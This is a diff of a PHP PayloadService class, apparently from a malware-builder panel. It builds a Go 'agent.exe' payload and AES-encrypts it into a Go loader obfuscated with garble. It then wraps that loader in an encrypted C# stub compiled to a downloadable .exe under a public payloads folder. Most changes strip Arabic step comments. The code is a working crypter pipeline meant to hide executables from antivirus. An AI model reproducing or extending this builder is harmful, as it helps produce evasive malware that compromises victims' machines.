@@ -11,14 +11,8 @@ class PayloadService
     private string $goBinPath = '/usr/local/go/bin';
     private string $garblePath = '/home/u113/go/bin/garble';
 
-    public function createPayloadProfile($profileId, $platform = 'windows', array $options = [])
-    {
-        // ... (هذه الدالة لا نحتاجها في الوقت الحالي، لكن تركناها فارغة لتجنب الأخطاء)
-    }
-
     public function buildLoaderPayload($profileId, $targetDirs)
     {
-        // معالجة إذا تم تمرير كائن Payload
         if (is_object($profileId)) {
             $targetDirs = $targetDirs ?? $profileId->target_directories;
             $profileId = $profileId->id;
@@ -28,10 +22,7 @@ class PayloadService
         if (!file_exists($tempDir)) {
             mkdir($tempDir, 0777, true);
         }
-        
-        // ==========================================
-        // الخطوة 1: بناء البايلود الأساسي (Agent.exe)
-        // ==========================================
+
         $originalScriptPath = $tempDir.'/agent.go';
         $originalExePath = $tempDir.'/agent.exe';
         
@@ -51,9 +42,6 @@ class PayloadService
             throw new \Exception("Failed to build original payload.");
         }
 
-        // ==========================================
-        // الخطوة 2: تشفير البايلود وبناء الـ Go Loader
-        // ==========================================
         $aesKey = random_bytes(32);
         $payloadData = file_get_contents($originalExePath);
         
@@ -93,14 +81,6 @@ class PayloadService
             throw new \Exception("Failed to build Go Loader.");
         }
 
-        // ==========================================
-        // الخطوة 3: بناء الـ C# Stub
-        // ==========================================
-        $finalStubPath = $this->buildCSharpStub($finalLoaderPath, $profileId);
-
-        // ==========================================
-        // الخطوة 4: تنظيف الملفات المؤقتة
-        // ==========================================
         @unlink($originalScriptPath);
         @unlink($originalExePath);
         @unlink($loaderScriptPath);
@@ -111,24 +91,20 @@ class PayloadService
 
     public function buildCSharpStub($goLoaderPath, $profileId)
     {
-        // 1. قراءة ملف الـ Go Loader
         if (!file_exists($goLoaderPath)) {
             throw new \Exception("Go Loader not found.");
         }
         $goLoaderData = file_get_contents($goLoaderPath);
 
-        // 2. تشفير الـ Go Loader بـ AES
         $cipher = "aes-256-cbc";
         $key = random_bytes(32);
         $iv = random_bytes(16);
         $encryptedData = openssl_encrypt($goLoaderData, $cipher, $key, OPENSSL_RAW_DATA, $iv);
 
-        // 3. تحويل البيانات إلى صيغة C#
         $csEncryptedData = $this->toCSharpByteArray($encryptedData);
         $csKey = $this->toCSharpByteArray($key);
         $csIv = $this->toCSharpByteArray($iv);
 
-        // 4. قراءة قالب C# وحقن البيانات
         $stubFile = resource_path('stubs/csharp_loader.cs');
         $csCode = file_get_contents($stubFile);
         
@@ -136,27 +112,24 @@ class PayloadService
         $csCode = str_replace('__AES_KEY__', $csKey, $csCode);
         $csCode = str_replace('__AES_IV__', $csIv, $csCode);
 
-        // 5. حفظ الكود في ملف مؤقت
         $tempDir = storage_path('app/temp/'.uniqid());
         mkdir($tempDir, 0777, true);
         $csFilePath = $tempDir.'/loader.cs';
         file_put_contents($csFilePath, $csCode);
 
-        // 6. تعريف مسار الملف النهائي
         $finalStubPath = storage_path('app/public/payloads/stub_'.$profileId.'.exe');
    
         $buildCmd = sprintf(
-    'mcs -out:%s -r:/usr/lib/mono/4.5/System.Windows.Forms.dll -r:/usr/lib/mono/4.5/System.Drawing.dll %s',
-    escapeshellarg($finalStubPath),
-    escapeshellarg($csFilePath)
-);
+            'mcs -out:%s -r:/usr/lib/mono/4.5/System.Windows.Forms.dll -r:/usr/lib/mono/4.5/System.Drawing.dll %s',
+            escapeshellarg($finalStubPath),
+            escapeshellarg($csFilePath)
+        );
         exec($buildCmd . ' 2>&1', $output, $returnCode);
 
         if ($returnCode !== 0) {
             throw new \Exception("C# build failed: " . implode("\n", $output));
         }
 
-        // تنظيف
         @unlink($csFilePath);
 
         return 'payloads/stub_'.$profileId.'.exe';
